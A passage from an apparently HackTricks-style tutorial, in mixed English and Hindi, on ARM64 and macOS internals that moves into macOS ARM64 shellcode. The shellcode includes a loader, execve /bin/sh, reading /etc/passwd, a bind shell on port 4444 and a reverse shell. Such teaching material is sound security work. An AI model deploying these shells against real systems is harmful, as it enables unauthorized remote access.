For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **overflowed**.

The **`SEL`** instruction uses these GE flags to perform conditional actions.

#### Execution State Registers

- The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
- **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
- **`E`** bit: Indicates the **endianness**.
- **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Sometimes it's easier to check the **decompiled** code from **`libsystem_kernel.dylib`** **than** checking the **source code** because the code of several syscalls (BSD and Mach) are generated via scripts (check comments in the source code) while in the dylib you can find what is being called.

### machdep calls

XNU supports another type of calls called machine dependent. The numbers of these calls depends on the architecture and neither the calls or numbers are guaranteed to remain constant.

### comm page

यह एक kernel-owned memory page है जो हर users process के address space में मैप होती है। इसका उद्देश्य user mode से kernel space में transition को तेज़ बनाना है — उन kernel services के लिए syscalls का उपयोग करने की बजाय जो इतना ज़्यादा उपयोग होते हैं कि वह transition बहुत अव्यवहारिक हो जाएगा।

For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.

### objc_msgSend

Objective-C या Swift प्रोग्राम्स में यह function बहुत आम है। यह function किसी Objective-C object के method को कॉल करने की अनुमति देता है।

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> इंस्टेंस के लिए Pointer
- x1: op -> मेथड का Selector
- x2... -> कॉल किए गए मेथड के बाकी arguments

So, if you put breakpoint before the branch to this function, you can easily find what is invoked in lldb with (in this example the object calls an object from `NSConcreteTask` that will run a command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> env परिवर्तनीय **`NSObjCMessageLoggingEnabled=1`** सेट करने पर यह संभव है कि जब यह function कॉल हो, तो उसे `/tmp/msgSends-pid` जैसी फ़ाइल में log किया जाए।
>
> इसके अलावा, **`OBJC_HELP=1`** सेट करके और किसी भी binary को कॉल करके आप अन्य environment variables देख सकते हैं जिनका उपयोग आप certain Objc-C actions के होने पर **log** करने के लिए कर सकते हैं।

जब इस function को कॉल किया जाता है, तो निर्दिष्ट instance के कॉल किए गए method को ढूँढना आवश्यक होता है; इसके लिए अलग-अलग तरह की खोजें की जाती हैं:

- optimistic cache lookup करें:
- यदि सफल है, समाप्त
- runtimeLock (read) प्राप्त करें
- यदि (realize && !cls->realized) तो class को realize करें
- यदि (initialize && !cls->initialized) तो class को initialize करें
- class की अपनी cache आज़माएँ:
- यदि सफल है, समाप्त
- class की method list आज़माएँ:
- यदि मिला, cache भरें और समाप्त
- superclass cache आज़माएँ:
- यदि सफल है, समाप्त
- superclass की method list आज़माएँ:
- यदि मिला, cache भरें और समाप्त
- यदि (resolver) तो method resolver आज़माएँ, और फिर class lookup से repeat करें
- यदि अभी भी यहाँ हैं (= बाकी सब असफल रहा) तो forwarder आज़माएँ

### Shellcodes

To compile:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
नए macOS के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C shellcode का परीक्षण करने के लिए कोड</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

यह [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) से ली गई और समझाई गई।

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat से पढ़ें

लक्ष्य `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना है, इसलिए दूसरा argument (x1) params का एक array है (जो memory में पतेओं के स्टैक का मतलब होता है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork से sh का उपयोग करके कमांड चलाएँ ताकि प्रमुख प्रक्रिया समाप्त न हो
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) से **port 4444** पर
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

स्रोत: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell को **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
